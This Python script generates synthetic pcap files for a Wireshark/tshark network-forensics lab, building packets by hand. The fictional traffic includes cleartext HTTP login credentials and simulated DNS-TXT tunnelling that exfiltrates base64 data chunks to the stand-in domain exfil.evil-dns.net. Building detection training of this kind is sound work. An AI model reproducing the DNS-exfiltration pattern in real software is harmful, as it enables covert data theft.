#!/usr/bin/env python3
"""Generate realistic .pcap seed files for the Wireshark/tshark lab (tools-wireshark-001).

scapy is NOT installed in this repo's toolchain, so every frame is built by hand
with the struct module: Ethernet / ARP / IPv4 / TCP / UDP / ICMP / DNS, with real
IP/TCP/UDP/ICMP checksums, written in classic pcap format (magic 0xa1b2c3d4,
microsecond timestamps, DLT_EN10MB).

Scenario (all traffic inside 10.10.10.0/24, entirely fictional):
  - workstation 10.10.10.5 browses the intranet web server 10.10.10.20
  - the login POST and an Authorization header carry CLEARTEXT credentials
  - a compromised process on the workstation exfiltrates data over DNS TXT
    queries to exfil.evil-dns.net (classic DNS tunneling)
  - a TLS ClientHello to 10.10.10.30:443 rounds out the protocol mix

Run:  python3 gen_pcap.py   -> writes capture.pcap and dns-exfil.pcap here.

Learners analyse with: tshark -r capture.pcap
  - protocols:      tshark -r capture.pcap -q -z io,phs
  - follow stream:  tshark -r capture.pcap -q -z follow,tcp,ascii,0
  - cleartext:      tshark -r capture.pcap -Y http -T fields -e http.authorization -e urlencoded-form.key -e urlencoded-form.value
  - DNS exfil:      tshark -r capture.pcap -Y dns -T fields -e dns.qry.name -e dns.qry.type
"""
from __future__ import annotations

import struct

CLIENT_MAC = bytes.fromhex("02420a0a0a05")
SERVER_MAC = bytes.fromhex("02420a0a0a14")
GW_MAC = bytes.fromhex("02420a0a0a01")
TLS_MAC = bytes.fromhex("02420a0a0a1e")
BROADCAST = bytes.fromhex("ffffffffffff")

CLIENT_IP = "10.10.10.5"
SERVER_IP = "10.10.10.20"
DNS_IP = "10.10.10.1"
TLS_IP = "10.10.10.30"


def mac(b: bytes) -> bytes:
    return b


def ip(s: str) -> bytes:
    return bytes(int(p) for p in s.split("."))


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def eth(dst: bytes, src: bytes, etype: int, payload: bytes) -> bytes:
    return struct.pack("!6s6sH", dst, src, etype) + payload


def arp_request(src_m: bytes, src_i: str, target_i: str) -> bytes:
    body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1)
    body += src_m + ip(src_i) + b"\x00" * 6 + ip(target_i)
    return eth(BROADCAST, src_m, 0x0806, body)


def arp_reply(src_m: bytes, src_i: str, dst_m: bytes, dst_i: str) -> bytes:
    body = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
    body += src_m + ip(src_i) + dst_m + ip(dst_i)
    return eth(dst_m, src_m, 0x0806, body)


def ipv4(src: str, dst: str, proto: int, payload: bytes, ident: int = 0xBEEF, ttl: int = 64) -> bytes:
    ver_ihl = 0x45
    total = 20 + len(payload)
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, 0, total, ident, 0x4000, ttl, proto, 0,
                      ip(src), ip(dst))
    csum = _checksum(hdr)
    hdr = struct.pack("!BBHHHBBH4s4s", ver_ihl, 0, total, ident, 0x4000, ttl, proto, csum,
                      ip(src), ip(dst))
    return hdr + payload


def tcp_seg(src: str, dst: str, sport: int, dport: int, seq: int, ack: int,
            flags: int, payload: bytes = b"", window: int = 64240) -> bytes:
    doff_flags = (5 << 12) | (flags & 0x1FF)
    hdr = struct.pack("!HHIIHHHH", sport, dport, seq, ack, doff_flags, window, 0, 0)
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, 6, len(hdr) + len(payload))
    csum = _checksum(pseudo + hdr + payload)
    hdr = struct.pack("!HHIIHHHH", sport, dport, seq, ack, doff_flags, window, csum, 0)
    return ipv4(src, dst, 6, hdr + payload)


def udp_seg(src: str, dst: str, sport: int, dport: int, payload: bytes) -> bytes:
    hdr = struct.pack("!HHHH", sport, dport, 8 + len(payload), 0)
    pseudo = ip(src) + ip(dst) + struct.pack("!BBH", 0, 17, len(hdr) + len(payload))
    csum = _checksum(pseudo + hdr + payload)
    hdr = struct.pack("!HHHH", sport, dport, 8 + len(payload), csum or 0xFFFF)
    return ipv4(src, dst, 17, hdr + payload)


def icmp_echo(src: str, dst: str, ident: int, seqn: int, icmp_type: int, payload: bytes = b"ping") -> bytes:
    hdr = struct.pack("!BBHHH", icmp_type, 0, 0, ident, seqn)
    csum = _checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", icmp_type, 0, csum, ident, seqn)
    return ipv4(src, dst, 1, hdr + payload)


def dns_name(name: str) -> bytes:
    return b"".join(bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\x00"


def dns_query(txid: int, qname: str, qtype: int = 1) -> bytes:
    hdr = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    return hdr + dns_name(qname) + struct.pack("!HH", qtype, 1)


def dns_a_answer(ttl: int, addr: str) -> bytes:
    # name pointer -> offset 12 (0xc00c), A record
    return b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, ttl, 4) + ip(addr)


def dns_response(txid: int, qname: str, qtype: int, rcode: int = 0, answers: bytes = b"") -> bytes:
    flags = 0x8180 | (rcode & 0xF)
    hdr = struct.pack("!HHHHHH", txid, flags, 1, 1 if answers else 0, 0, 0)
    return hdr + dns_name(qname) + struct.pack("!HH", qtype, 1) + answers


# Minimal but well-formed TLS 1.2 ClientHello (enough for tshark to dissect as TLS).
TLS_CLIENT_HELLO = bytes.fromhex(
    "16030100c2"          # TLS record: handshake, TLS1.0, length 194
    "010000be0303"        # handshake: ClientHello, length 190, TLS1.2
    "5f6e6f7071726f70726f70726f70726f70726f70726f70726f70726f70726f70"  # 32B random
    "00"                # session id length 0
    "0004c02cc030"      # cipher suites length 4: 2 suites
    "0100"              # compression methods
    "006b"              # extensions length 107
    "0000000d00160014"  # server_name (empty-ish) ... kept short
    "000500050100000000"
    "000a00080006001d00170018"
    "000b00020100"
    "000d001a00180804080501080503080403020103020102"
    "00170000"
    "002b0009080304030303020301"
    "003300260024001d00206e6f7071726f70726f70726f70726f70726f70726f70726f70726f70"
)


class Pcap:
    def __init__(self, path: str):
        self.f = open(path, "wb")
        # magic, ver_major, ver_minor, thiszone, sigfigs, snaplen, network(DLT_EN10MB)
        self.f.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))

    def pkt(self, ts: float, frame: bytes) -> None:
        us = int(ts * 1_000_000)
        self.f.write(struct.pack("<IIII", us // 1_000_000, us % 1_000_000, len(frame), len(frame)))
        self.f.write(frame)

    def close(self) -> None:
        self.f.close()


BASE_TS = 1_700_000_000.0  # 2023-11-14T22:13:20Z — fixed for determinism


def build_capture() -> None:
    """Mixed capture: ARP, DNS, a full HTTP login TCP stream with cleartext
    credentials, a TLS ClientHello, ICMP, and DNS-TXT exfiltration."""
    p = Pcap("capture.pcap")
    t = BASE_TS

    def emit(frame: bytes, dt: float = 0.05) -> None:
        nonlocal t
        t += dt
        p.pkt(t, frame)

    # --- ARP: workstation resolves the gateway ---
    emit(arp_request(CLIENT_MAC, CLIENT_IP, DNS_IP), 0.0)
    emit(arp_reply(GW_MAC, DNS_IP, CLIENT_MAC, CLIENT_IP))

    # --- DNS: ordinary lookup for www.example.com ---
    q = dns_query(0x1234, "www.example.com", 1)
    emit(eth(GW_MAC, CLIENT_MAC, 0x0800, udp_seg(CLIENT_IP, DNS_IP, 53333, 53, q)))
    r = dns_response(0x1234, "www.example.com", 1, 0, dns_a_answer(300, "93.184.216.34"))
    emit(eth(CLIENT_MAC, GW_MAC, 0x0800, udp_seg(DNS_IP, CLIENT_IP, 53, 53333, r)), 0.02)

    # --- TCP stream 0: HTTP login with cleartext credentials ---
    sport, cseq, sseq = 43111, 1000, 5000
    SYN, ACK, PSH, FIN = 0x02, 0x10, 0x08, 0x01

    def c2s(seq, ack, flags, payload=b""):
        return eth(SERVER_MAC, CLIENT_MAC, 0x0800,
                   tcp_seg(CLIENT_IP, SERVER_IP, sport, 80, seq, ack, flags, payload))

    def s2c(seq, ack, flags, payload=b""):
        return eth(CLIENT_MAC, SERVER_MAC, 0x0800,
                   tcp_seg(SERVER_IP, CLIENT_IP, 80, sport, seq, ack, flags, payload))

    emit(c2s(cseq, 0, SYN)); cseq += 1
    emit(s2c(sseq, cseq, SYN | ACK)); sseq += 1
    emit(c2s(cseq, sseq, ACK))

    get_login = (b"GET /login.html HTTP/1.1\r\nHost: intranet.lan\r\n"
                 b"User-Agent: Mozilla/5.0 (Training-Lab)\r\nConnection: keep-alive\r\n\r\n")
    emit(c2s(cseq, sseq, ACK | PSH, get_login)); cseq += len(get_login)
    emit(s2c(sseq, cseq, ACK))
    login_page = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 128\r\n\r\n"
                  b"<html><body><h1>Intranet login</h1>"
                  b"<form method=POST action=/login>user/pass</form></body></html>")
    emit(s2c(sseq, cseq, ACK | PSH, login_page)); sseq += len(login_page)
    emit(c2s(cseq, sseq, ACK))

    # *** cleartext credential #1: login POST ***
    post_login = (b"POST /login HTTP/1.1\r\nHost: intranet.lan\r\n"
                  b"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\n"
                  b"username=admin&password=Sup3rS3cret!")
    emit(c2s(cseq, sseq, ACK | PSH, post_login)); cseq += len(post_login)
    emit(s2c(sseq, cseq, ACK))
    redir = (b"HTTP/1.1 302 Found\r\nLocation: /dashboard\r\nContent-Length: 0\r\n\r\n")
    emit(s2c(sseq, cseq, ACK | PSH, redir)); sseq += len(redir)
    emit(c2s(cseq, sseq, ACK))

    # *** cleartext credential #2: HTTP Basic auth header (admin:password123) ***
    get_dash = (b"GET /dashboard HTTP/1.1\r\nHost: intranet.lan\r\n"
                b"Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=\r\n\r\n")
    emit(c2s(cseq, sseq, ACK | PSH, get_dash)); cseq += len(get_dash)
    emit(s2c(sseq, cseq, ACK))
    dash = (b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 21\r\n\r\n"
            b"<h1>Welcome admin</h1>")
    emit(s2c(sseq, cseq, ACK | PSH, dash)); sseq += len(dash)
    emit(c2s(cseq, sseq, ACK))
    emit(c2s(cseq, sseq, ACK | FIN)); cseq += 1
    emit(s2c(sseq, cseq, ACK | FIN)); sseq += 1
    emit(c2s(cseq, sseq, ACK))

    # --- TLS ClientHello to 10.10.10.30:443 (protocol mix) ---
    tsport, tseq = 44123, 2000
    emit(eth(TLS_MAC, CLIENT_MAC, 0x0800,
             tcp_seg(CLIENT_IP, TLS_IP, tsport, 443, tseq, 0, SYN)), 0.3)
    tseq += 1
    emit(eth(TLS_MAC, CLIENT_MAC, 0x0800,
             tcp_seg(CLIENT_IP, TLS_IP, tsport, 443, tseq, 1, ACK | PSH, TLS_CLIENT_HELLO)))
    tseq += len(TLS_CLIENT_HELLO)

    # --- ICMP ping workstation <-> server ---
    emit(eth(SERVER_MAC, CLIENT_MAC, 0x0800,
             icmp_echo(CLIENT_IP, SERVER_IP, 0xBEEF, 1, 8)), 0.4)
    emit(eth(CLIENT_MAC, SERVER_MAC, 0x0800,
             icmp_echo(SERVER_IP, CLIENT_IP, 0xBEEF, 1, 0)), 0.02)

    # --- DNS exfiltration: TXT queries for data chunks under exfil.evil-dns.net ---
    chunks = [
        "aGVsbG8td29ybGQtY2h1bmstMDAx",
        "c2VjcmV0LWRvY3VtZW50LTAwMg",
        "cGFzc3dvcmQtbGlzdC0wMDM",
        "ZmluYW5jaWFsLXJlcG9ydC0wMDQ",
        "Y3VydGlmaWNhdGUtZmlsZS0wMDU",
        "bmV0d29yay1tYXAtZGF0YS0wMDY",
        "ZW1wbG95ZWUtZGItMDA3",
        "c2Vzc2lvbi10b2tlbnMtMDA4",
    ]
    dport = 54444
    for i, chunk in enumerate(chunks):
        qname = f"{chunk}.exfil.evil-dns.net"
        txid = 0x2000 + i
        emit(eth(GW_MAC, CLIENT_MAC, 0x0800,
                 udp_seg(CLIENT_IP, DNS_IP, dport, 53, dns_query(txid, qname, 16))), 0.15)
        # NXDOMAIN: nothing there, but the query already carried the data out
        emit(eth(CLIENT_MAC, GW_MAC, 0x0800,
                 udp_seg(DNS_IP, CLIENT_IP, 53, dport, dns_response(txid, qname, 16, rcode=3))), 0.02)

    p.close()
    print("wrote capture.pcap")


def build_dns_exfil() -> None:
    """Focused DNS-tunneling capture: 14 TXT queries exfiltrating fake chunks to
    data.exfil.evil-dns.net, with two ordinary A queries as noise."""
    p = Pcap("dns-exfil.pcap")
    t = BASE_TS

    def emit(frame: bytes, dt: float = 0.1) -> None:
        nonlocal t
        t += dt
        p.pkt(t, frame)

    chunks = [
        "Y3VzdG9tZXItZGF0YWJhc2UtZHVtcC0wMQ",
        "Y3JlZGl0LWNhcmQtZmlsZS1mYWtlLTAy",
        "aW50ZXJuYWwtd2lraS1leHBvcnQtMDM",
        "c2FsYXJ5LWNzdi1mYWtlLTA0",
        "dmVwbi1jb25maWctYmFja3VwLTA1",
        "bGljZW5zZS1rZXlzLWZha2UtMDY",
        "YmFja3VwLXRhcGVzLWZha2UtMDc",
        "ZG9tYWluLWFkbWluLXB3ZC1mYWtl",
        "YXVkaXQtbG9ncy1hcmNoaXZlLTA5",
        "a2VybmVsLWR1bXAtZmFrZS0xMA",
        "Y29yZS1maWxlcy1mYWtlLTEx",
        "bWVtb3J5LWR1bXAtZmFrZS0xMg",
        "cHJvY2Vzcy1saXN0LWZha2UtMTM",
        "ZmluYWwtY2h1bmstZmFrZS0xNA",
    ]
    dport = 55555
    # two ordinary lookups as noise
    for i, name in enumerate(("www.example.com", "mail.example.com")):
        txid = 0x3000 + i
        emit(eth(GW_MAC, CLIENT_MAC, 0x0800,
                 udp_seg(CLIENT_IP, DNS_IP, dport, 53, dns_query(txid, name, 1))))
        emit(eth(CLIENT_MAC, GW_MAC, 0x0800,
                 udp_seg(DNS_IP, CLIENT_IP, 53, dport,
                         dns_response(txid, name, 1, 0, dns_a_answer(300, "93.184.216.34")))), 0.03)
    for i, chunk in enumerate(chunks):
        qname = f"{chunk}.data.exfil.evil-dns.net"
        txid = 0x4000 + i
        emit(eth(GW_MAC, CLIENT_MAC, 0x0800,
                 udp_seg(CLIENT_IP, DNS_IP, dport, 53, dns_query(txid, qname, 16))), 0.12)
        emit(eth(CLIENT_MAC, GW_MAC, 0x0800,
                 udp_seg(DNS_IP, CLIENT_IP, 53, dport,
                         dns_response(txid, qname, 16, rcode=3))), 0.02)

    p.close()
    print("wrote dns-exfil.pcap")


if __name__ == "__main__":
    build_capture()
    build_dns_exfil()
